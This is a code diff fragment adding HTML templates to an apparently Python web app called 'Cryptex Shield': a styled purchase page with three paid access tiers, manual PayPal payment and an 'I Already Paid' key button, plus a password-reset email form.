+    .paypal-info { background: rgba(0,60,120,0.15); padding: 15px; border-radius: 12px; border: 1px solid rgba(0,112,186,0.2); margin: 20px 0; }
+    .paypal-info strong { color: #00aaff; font-size: 18px; }
+    .back { color: #00ffcc99; text-decoration: none; display: block; margin-top: 20px; }
+    .back:hover { color: #00ffcc; }
+</style>
+</head>
+<body>
+    <div class="container">
+        <h2>💰 PURCHASE</h2>
+        <p class="sub">Choose your tier</p>
+        <div class="pricing-grid">
+            <div class="plan">
+                <div class="info"><div class="name">🔥 1 Day</div><div class="desc">24 hour access • Basic features</div></div>
+                <div style="display:flex; align-items:center; gap:15px;">
+                    <div class="price">$4.99</div>
+                    <form method="POST" action="/paypal-redirect" style="display:inline;">
+                        <input type="hidden" name="tier" value="1day">
+                        <button type="submit" class="btn-buy">Buy</button>
+                    </form>
+                </div>
+            </div>
+            <div class="plan" style="border-color:#00aaff44;">
+                <div class="info"><div class="name">⚡ 5 Day</div><div class="desc">Extended access • All features</div></div>
+                <div style="display:flex; align-items:center; gap:15px;">
+                    <div class="price">$14.99</div>
+                    <form method="POST" action="/paypal-redirect" style="display:inline;">
+                        <input type="hidden" name="tier" value="5day">
+                        <button type="submit" class="btn-buy">Buy</button>
+                    </form>
+                </div>
+            </div>
+            <div class="plan" style="border-color:#ff006644;">
+                <div class="info"><div class="name">👑 Infinite</div><div class="desc">Lifetime access • All features unlocked</div></div>
+                <div style="display:flex; align-items:center; gap:15px;">
+                    <div class="price">$29.99</div>
+                    <form method="POST" action="/paypal-redirect" style="display:inline;">
+                        <input type="hidden" name="tier" value="infinite">
+                        <button type="submit" class="btn-buy">Buy</button>
+                    </form>
+                </div>
+            </div>
+        </div>
+        <div class="paypal-info">
+            <p style="color:#8899bb;">Send payment via PayPal to:</p>
+            <strong>💳 LingLing855</strong>
+            <p style="color:#6688aa; font-size:13px; margin-top:5px;">Include your <b>email</b> in the note for key delivery</p>
+        </div>
+        <form method="POST" action="/manual-key">
+            <input type="hidden" name="tier" value="infinite">
+            <button type="submit" style="padding:12px 30px; border-radius:30px; border:none; background:linear-gradient(135deg,#ff8800,#ff4400); color:#fff; font-weight:700; cursor:pointer; font-family:'Rajdhani',sans-serif; text-transform:uppercase; letter-spacing:1px;">🔑 I Already Paid (Get Key)</button>
+        </form>
+        <a href="/" class="back">← Back to Home</a>
+    </div>
+</body>
+</html>
+'''
+
+FORGOT_TEMPLATE = '''
+<!DOCTYPE html>
+<html>
+<head><title>🔑 Reset - Cryptex Shield</title>
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Rajdhani:wght@300;400;600;700&display=swap');
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: 'Rajdhani', sans-serif; background: #0a0a12; color: #fff; display: flex; height: 100vh; align-items: center; justify-content: center; }
+    .container { background: rgba(21,21,37,0.9); padding: 40px; border-radius: 30px; border: 1px solid rgba(0,255,204,0.15); width: 400px; max-width: 92%; backdrop-filter: blur(20px); }
+    .container h2 { font-family: 'Orbitron', monospace; color: #00ffcc; text-align: center; margin-bottom: 10px; }
+    input { width: 100%; padding: 16px; margin: 10px 0; border-radius: 12px; border: 1px solid rgba(42,42,74,0.8); background: rgba(10,10,18,0.8); color: #fff; font-size: 16px; font-family: 'Rajdhani', sans-serif; }
+    input:focus { outline: none; border-color: #00ffcc; }
+    button { width: 100%; padding: 16px; border-radius: 12px; border: none; background: linear-gradient(135deg, #00ffcc, #00ddff); color: #0a0a12; font-weight: 700; font-size: 18px; cursor: pointer; font-family: 'Rajdhani', sans-serif; text-transform: uppercase; letter-spacing: 2px; }
+    button:hover { transform: scale(1.02); }
+    .back { color: #00ffcc99; text-decoration: none; display: block; text-align: center; margin-top: 15px; }
+    .message { color: #00ff88; text-align: center; margin: 10px 0; }
+</style>
+</head>
+<body>
+    <div class="container">
+        <h2>🔑 Reset</h2>
+        {% if message %}<div class="message">{{ message }}</div>{% endif %}
+        <form method="POST">
+            <input type="email" name="email" placeholder="Email" required>
+            <button type="submit">Send Reset Link</button>
+        </form>
+        <a href="/login" class="back">← Back</a>
+    </div>
+</body>
+</html>
+'''
+
 # ============================================================
 # MAIN
 # ============================================================
 if __name__ == '__main__':
-    # Force database initialization
     print("📁 Initializing database...")
     init_db()
     print("✅ Database ready!")
